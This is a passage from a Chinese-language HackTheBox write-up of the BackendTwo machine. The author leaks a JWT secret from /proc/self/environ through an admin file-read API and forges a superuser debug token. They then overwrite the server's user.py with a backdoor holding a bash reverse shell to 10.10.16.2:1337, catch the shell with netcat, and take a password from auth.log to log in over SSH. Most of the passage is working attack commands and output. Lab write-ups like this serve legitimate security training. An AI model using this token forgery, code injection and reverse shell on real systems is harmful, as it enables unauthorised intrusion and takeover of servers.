class="hljs-string">&quot;/api/v1&quot;</span><br>    JWT_SECRET: <span class="hljs-built_in">str</span> = os.environ[<span class="hljs-string">&#x27;API_KEY&#x27;</span>]<br>    ALGORITHM: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;HS256&quot;</span><br><br>    <span class="hljs-comment"># 60 minutes * 24 hours * 8 days = 8 days</span><br>    ACCESS_TOKEN_EXPIRE_MINUTES: <span class="hljs-built_in">int</span> = <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># BACKEND_CORS_ORIGINS is a JSON-formatted list of origins</span><br>    <span class="hljs-comment"># e.g: &#x27;[&quot;http://localhost&quot;, &quot;http://localhost:4200&quot;, &quot;http://localhost:3000&quot;, \</span><br>    <span class="hljs-comment"># &quot;http://localhost:8080&quot;, &quot;http://local.dockertoolbox.tiangolo.com&quot;]&#x27;</span><br>    BACKEND_CORS_ORIGINS: <span class="hljs-type">List</span>[AnyHttpUrl] = []<br><br><span class="hljs-meta">    @validator(<span class="hljs-params"><span class="hljs-string">&quot;BACKEND_CORS_ORIGINS&quot;</span>, pre=<span class="hljs-literal">True</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">assemble_cors_origins</span>(<span class="hljs-params">cls, v: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">Union</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> v.startswith(<span class="hljs-string">&quot;[&quot;</span>):<br>            <span class="hljs-keyword">return</span> [i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v.split(<span class="hljs-string">&quot;,&quot;</span>)]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(v, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">str</span>)):<br>            <span class="hljs-keyword">return</span> v<br>        <span class="hljs-keyword">raise</span> ValueError(v)<br><br>    SQLALCHEMY_DATABASE_URI: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-string">&quot;sqlite:///uhc.db&quot;</span><br>    FIRST_SUPERUSER: EmailStr = <span class="hljs-string">&quot;root@ippsec.rocks&quot;</span>    <br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>        case_sensitive = <span class="hljs-literal">True</span><br> <br><br>settings = Settings()<br></code></pre></td></tr></table></figure>

<p>它是从环境变量中读取API_KEY的。再尝试读取&#x2F;proc&#x2F;self&#x2F;environ：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.162/api/v1/admin/file/L3Byb2Mvc2VsZi9lbnZpcm9u&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&#x27;</span><br>&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;USER=htb\u0000HOME=/home/htb\u0000OLDPWD=/\u0000PORT=80\u0000LOGNAME=htb\u0000JOURNAL_STREAM=9:18117\u0000APP_MODULE=app.main:app\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000INVOCATION_ID=ec98ffc73ac546b8a30f47a8d08cc16e\u0000LANG=C.UTF-8\u0000API_KEY=68b329da9893e34099c7d8ad5cb9c940\u0000HOST=0.0.0.0\u0000PWD=/home/htb\u0000&quot;</span>&#125;                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure>

<p>然后制作JWT令牌：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ python           <br>Python <span class="hljs-number">3.10</span><span class="hljs-number">.5</span> (main, Jun  <span class="hljs-number">8</span> <span class="hljs-number">2022</span>, 09:<span class="hljs-number">26</span>:<span class="hljs-number">22</span>) [GCC <span class="hljs-number">11.3</span><span class="hljs-number">.0</span>] on linux<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> jwt<br><span class="hljs-meta">&gt;&gt;&gt; </span>token = <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>key = <span class="hljs-string">&quot;68b329da9893e34099c7d8ad5cb9c940&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>decoded = jwt.decode(token, key, [<span class="hljs-string">&quot;HS256&quot;</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>decoded<br>&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;access_token&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>: <span class="hljs-number">1662341529</span>, <span class="hljs-string">&#x27;iat&#x27;</span>: <span class="hljs-number">1661650329</span>, <span class="hljs-string">&#x27;sub&#x27;</span>: <span class="hljs-string">&#x27;12&#x27;</span>, <span class="hljs-string">&#x27;is_superuser&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;guid&#x27;</span>: <span class="hljs-string">&#x27;a7d1cccb-6134-4f91-a135-33b66a2d653b&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>decoded[<span class="hljs-string">&quot;debug&quot;</span>] = <span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>jwt.encode(decoded, key, <span class="hljs-string">&quot;HS256&quot;</span>)<br><span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8&#x27;</span><br></code></pre></td></tr></table></figure>

<p>但写入ssh还是报错，我猜测是ssh目录不存在。那我可能需要通过尝试将代码写入到服务器后端代码文件中，再人为的尝试访问从而达到代码执行的效果：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8&#x27;</span><br>&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -&gt; Any:\n    if field.field_info.extra.get(\&quot;hidden_from_schema\&quot;, False):\n        raise schema.SkipField(f\&quot;&#123;field.name&#125; field is being hidden\&quot;)\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\&quot;/&#123;user_id&#125;\&quot;, status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Fetch a user by ID\n    \&quot;\&quot;\&quot;\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\&quot;/&#123;user_id&#125;/edit\&quot;)\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Edit the profile of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()\n    if token[&#x27;is_superuser&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.put(\&quot;/&#123;user_id&#125;/password\&quot;)\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Update the password of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()\n    if token[&#x27;is_superuser&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.post(\&quot;/login\&quot;)\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Get the JWT for a user with data from OAuth2 request form body.\n    \&quot;\&quot;\&quot;\n    \n    timestamp = datetime.now().strftime(\&quot;%m/%d/%Y, %H:%M:%S\&quot;)\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Failure for &#123;form_data.username&#125;\\n\&quot;)\n        raise HTTPException(status_code=400, detail=\&quot;Incorrect username or password\&quot;)\n    \n    with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Success for &#123;form_data.username&#125;\\n\&quot;)\n\n    return &#123;\n        \&quot;access_token\&quot;: create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \&quot;token_type\&quot;: \&quot;bearer\&quot;,\n    &#125;\n\n@router.post(\&quot;/signup\&quot;, status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Create new user without the need to be logged in.\n    \&quot;\&quot;\&quot;\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\&quot;The user with this username already exists in the system\&quot;,\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n&quot;</span>&#125;   <br></code></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ curl http://<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.162</span>/api/v1/admin/file/$(echo -n <span class="hljs-string">&quot;/home/htb/app/api/v1/endpoints/user.py&quot;</span> | base64) -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;file&quot;: &quot;from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -&gt; Any:\n    if field.field_info.extra.get(\&quot;hidden_from_schema\&quot;, False):\n        raise schema.SkipField(f\&quot;&#123;field.name&#125; field is being hidden\&quot;)\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\&quot;/&#123;user_id&#125;\&quot;, status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Fetch a user by ID\n    \&quot;\&quot;\&quot;\n    if user_id == -2222:\n        import os; os.system(&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>bash -c \<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.2/1337 0&gt;&amp;1\&quot;&#x27;\&#x27;&#x27;)\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\&quot;/&#123;user_id&#125;/edit\&quot;)\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Edit the profile of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()\n    if token[&#x27;\&#x27;&#x27;is_superuser&#x27;\&#x27;&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.put(\&quot;/&#123;user_id&#125;/password\&quot;)\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Update the password of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()\n    if token[&#x27;\&#x27;&#x27;is_superuser&#x27;\&#x27;&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.post(\&quot;/login\&quot;)\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Get the JWT for a user with data from OAuth2 request form body.\n    \&quot;\&quot;\&quot;\n    \n    timestamp = datetime.now().strftime(\&quot;%m/%d/%Y, %H:%M:%S\&quot;)\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Failure for &#123;form_data.username&#125;\\n\&quot;)\n        raise HTTPException(status_code=400, detail=\&quot;Incorrect username or password\&quot;)\n    \n    with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Success for &#123;form_data.username&#125;\\n\&quot;)\n\n    return &#123;\n        \&quot;access_token\&quot;: create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \&quot;token_type\&quot;: \&quot;bearer\&quot;,\n    &#125;\n\n@router.post(\&quot;/signup\&quot;, status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Create new user without the need to be logged in.\n    \&quot;\&quot;\&quot;\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\&quot;The user with this username already exists in the system\&quot;,\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n&quot;</span>&#125;<span class="hljs-string">&#x27; -H &#x27;</span>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#123;&quot;result&quot;:&quot;success&quot;&#125;   </span><br><span class="hljs-string">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/-2222</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ nc -lvnp <span class="hljs-number">1337</span><br>listening on [<span class="hljs-built_in">any</span>] <span class="hljs-number">1337</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.2</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.162</span>] <span class="hljs-number">51872</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (<span class="hljs-number">681</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>To run a command <span class="hljs-keyword">as</span> administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>htb@BackendTwo:~$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=<span class="hljs-number">1000</span>(htb) gid=<span class="hljs-number">1000</span>(htb) groups=<span class="hljs-number">1000</span>(htb),<span class="hljs-number">4</span>(adm),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">27</span>(sudo),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">116</span>(lxd)<br>htb@BackendTwo:~$ <br></code></pre></td></tr></table></figure>

<p>还是老样子，留了个密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ <span class="hljs-built_in">cat</span> auth.log <br>08/27/2022, 23:27:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:31:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:44:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:47:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:52:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:56:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:09:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:17:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:19:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:26:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:34:30 - Login Failure <span class="hljs-keyword">for</span> 1qaz2wsx_htb!<br>08/28/2022, 00:36:05 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:36:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:36:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:37:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:42:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:49:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 01:08:19 - Login Failure <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/28/2022, 01:08:45 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/28/2022, 01:29:45 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/28/2022, 01:32:08 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br></code></pre></td></tr></table></figure>

<p>但是这次不能切换root.它是htb的密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ssh htb@10.10.11.162                                             <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.162 (10.10.11.162)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.162<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">htb@10.10.11.162&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>0 updates can be applied immediately.<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>htb@BackendTwo:~$ <br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> htb: <br>--- Welcome to PAM-Wordle! ---<br><br>A five character [a-z] word has been selected.<br>You have 6 attempts to guess the word.<br><br>After each guess you will recieve a hint <span class="hljs-built_in">which</span> indicates:<br>? - what letters are wrong.<br>* - what letters are <span class="hljs-keyword">in</span> the wrong spot.<br>[a-z] - what letters are correct.<br><br>--- Attempt 1 of 6 ---<br>Word: <br></code></pre></td></tr></table></figure>

<p>还要玩猜字游戏。&#x2F;etc&#x2F;pam.d是包含各种自定义模块的目录，里边有一个sudo的配置文件，可以详细的看到sudo 定义关联了哪些：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ <span class="hljs-built_in">cd</span> /etc/pam.d<br>htb@BackendTwo:/etc/pam.d$ <span class="hljs-built_in">ls</span><br>atd             common-password                other      su<br>chfn            common-session                 passwd     su-l<br>chpasswd        common-session-noninteractive  polkit-1   sudo<br>chsh            cron                           runuser    systemd-user<br>common-account  login                          runuser-l  vmtoolsd<br>common-auth     newusers                       sshd<br>htb@BackendTwo:/etc/pam.d$ <span class="hljs-built_in">cat</span> sudo<br><span class="hljs-comment">#%PAM-1.0</span><br><br>session    required   pam_env.so readenv=1 user_readenv=0<br>session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0<br>auth    required pam_unix.so<br>auth    required    pam_wordle.so<br>@include common-auth<br>@include common-account<br>@include 